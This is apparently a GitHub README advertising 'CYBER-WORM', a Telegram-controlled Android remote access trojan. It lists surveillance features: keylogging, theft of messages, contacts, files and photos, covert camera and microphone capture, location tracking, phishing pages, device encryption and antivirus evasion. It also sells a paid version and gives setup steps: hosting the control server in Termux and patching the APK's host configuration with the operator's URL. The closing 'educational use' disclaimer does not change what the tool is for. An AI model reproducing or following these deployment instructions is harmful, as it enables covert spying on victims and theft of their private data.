<h1 align=center> CYBER-WORM </h1>

-------------------------

<p align="center">
  <i>A multifunctional Telegram based Android Hacking OSINT without port forwarding</i>
</p>


## Features
-🔐 Keylogger {Availbe in apk v1 and v2}
- 📱 Control Keys (Back, Recent, Home)
- 🔊 Control device volume
- ✨ Beautiful telegram bot interface
- 🤖 Undetectable by antivirus
  ## CYBER-WORM T PAID VERSION FEATURES
- 🖥️ Screenshot (get screenshot from your victim device)
- 📒 Gallery puller (Get all photos available in gallery)
-  🔤 Advance Keylogger
- 🔴 Real time
- 🌐 custom web view
- 📡 receive information about simcard provider
- 📳 vibrate target device
- 🛰️ receive device location
- ✉️ receive all target message
- ✉️ send sms with target device to any number
- ✉️ send sms with target device to all of his/her contacts
- 👤 recive all target contacts
- 💻 receive list of all installedd apps in target device
- 📁 receive any file or folder from target device
- 📁 delete any file or folder from target device
- 🔔 notification reader
- 🔔 notification sender (send custom notification that apper on target device with custom click link)
- 🗨️ show toast message on target device (Toasts are messages that appear in a box at the bottom of the device)
- 📷 capture main and front camera
- 🎙 capture microphone (with custom duration)
- 📋 receive last clipboard text
- 🔦 Torch ON & OFF {if flash available on device}
- ✅️ auto start after device boot
- 🔐 Open any phising page in victim device
-  📁 PowerFull file manager {delete and Download Files}
-  Auto grant permissions
-  Decrypt & Encrypt device
- ✨ Beautiful telegram bot interface
- 🤖 Undetectable by antivirus
  <p align="center">
  <a href="https://t.me/MiHRK_Owner">
    <img src="https://img.shields.io/badge/BUY-NOW-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
  </a>
  <a href="https://t.me/Hidden_Database">
    <img src="https://img.shields.io/badge/BUY-NOW-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
  </a>
  <a href="https://t.me/Technical_Robot">
    <img src="https://img.shields.io/badge/BUY-NOW-blue?style=for-the-badge&logo=telegram" alt="Telegram Badge"/>
  </a>
  </p>
<h2>Requirements</h2>
<ul>
  <li><span style="color: #0074D9;">APK EDITOR</span></li>
  <li><span style="color: #2ECC40;">TERMUX</span></li>
  <li>For hosting server code, you can use some free services like:</li>
  <ul>
    <li><a href="https://replit.com/@VivekOberoi/CYBER-WORM-Hosting#index.js" style="color: #FF4136;">🍁𝐓𝐎𝐏-𝟏👉🏻 (Replit.com)</a></li>
    <li><a href="https://glitch.com/" style="color: #FFDC00;">glitch.com</a></li>
    <li><a href="https://heroku.com/" style="color: #B10DC9;">heroku.com</a></li>
    <li><a href="https://render.com/" style="color: #B10DC9;">render.com</a></li>
  </ul>
  <p align="center">
  
  </a>
</p>
  <li>Keep in mind that these sites can suspend your projects, so it's better to host on your own computer.</li>
  
</ul>

<h2 align="center">Download</h2>

<p align="center">
  <a href="https://github.com/Technical-Robot/Termux_0.119.1/raw/main/Termux_0.119.1_Letest_Ver%20signed%20by%20F-Droid_.zip">
    <img src="https://img.shields.io/badge/Termux%20Download-Click%20to%20Download-brightgreen?style=for-the-badge&logo=android" alt="Download Termux" />
  </a>
  <a href="https://github.com/Technical-Robot/Apk-Editor-Pro-2024/raw/main/APK%20Editor%20UI_3.0.6.apk">
    <img src="https://img.shields.io/badge/APK%20Editor%20Download-Click%20to%20Download-brightgreen?style=for-the-badge&logo=android" alt="Download APK Editor" />
  </a>
</p>


## How to host server in Termux 
<p>Run the following commands in Termux:</p>



```bash  
  pkg update && upgrade -y
  
  pkg install git -y
  
  git clone https://github.com/Technical-Robot/CYBER-WORM
  
  cd CYBER-WORM
  
  bash start.sh
  
Enter your bot token 

Enter your chatid 

And hit enter

Now open a new Tab, and give these commands

pkg install openssh

bash port.sh 

Enter your telegram username And hit enter 

Copy url and minimize the termux
```

## Edit apk
 - Open Apk editor 
 - select apk
 - choose full edit
 - select decode all files
 - go to assets folder
 - open host.json
 - and enter url
 - in socket replace url https to wss 
 - build apk ,start the bott  Enjoy

## example
```bash  
  { 
  "host": "https://yoururl.com/", 
  "socket": "wss://yoururl.com/", 
  "webView": "https://google.com/" 
}
```

## How to Build in Android Studio

To build the application in Android Studio, follow these steps:

1. Open the Android Studio and import the application source code.
2. Navigate to the following path in the source code: `Utils/AppTools.java`.
3. In the `AppTools.java` file, locate the `data` variable and copy your server information into it.
4. However, before copying the server information directly into the variable, you must encode it using Base64.
5. Here is an example server structure for your server information:
```
{
"host" : "",
"socket" : "",
"webView" : "https://www.google.com"
}
```

6. Fill in the above server structure with your server information.
7. Go to https://www.base64encode.org/ and copy the encoded result of your server data.
8. In Android Studio, paste the encoded result into the `data` variable.
9. The final code should look like this:

```java
public static AppData getAppData() {
  String data = "<your encoded server info>";
  String text = decode(data);
  return new Gson().fromJson(text, AppData.class);
}
```



<p align="center">
  <img src="https://img.shields.io/badge/Disclaimer-Important-red" alt="Important Disclaimer"/>
</p>

<p align="center">
  <b><i>Note:</i></b> The developer provides no warranty with this software and will not be responsible for any direct or indirect damage caused by the usage of this tool. CYBER-WORM is built for educational and internal use only.
</p>

<p align="center">
  <b><i>Attention:</i></b> We do not endorse any illegal or unethical use of this tool. The user assumes all responsibility for the use of this software.
</p>


<p align="center">
  <b><i>Thank you for using CYBER-WORM  - we hope it serves its intended purpose and helps you achieve your goals!</i></b>
</p>





<p align="center">
<h1 align="center">Sponsorship</h1>

<p align="center">If you find my work valuable, you can show your support by sponsoring me. 
  Your contribution will help me maintain and improve my projects, and it will encourage me to create more useful content.</p>




<p align="center">Thank you to the following people for their support:</p>


</div>

  <br>

  <h1 align=center>Technology Stack Used</h1>
  <p align="center">
    <img src="https://img.shields.io/badge/backend-javascript-violet.svg?logo=javascript&style=flat-square" alt="Javascript" </img>
    <img src="https://img.shields.io/badge/frontend-shell-green.svg?logo=shell&style=flat-square" alt="Shell"</img>
    <img src="https://img.shields.io/badge/frontend-java-orange.svg?logo=java&style=flat-square" alt="Java"</img>
    <img src="https://img.shields.io/badge/frontend-kotlin-violet.svg?logo=kotlin&style=flat-square" alt="Shell"</img>
  </p>

  <br>
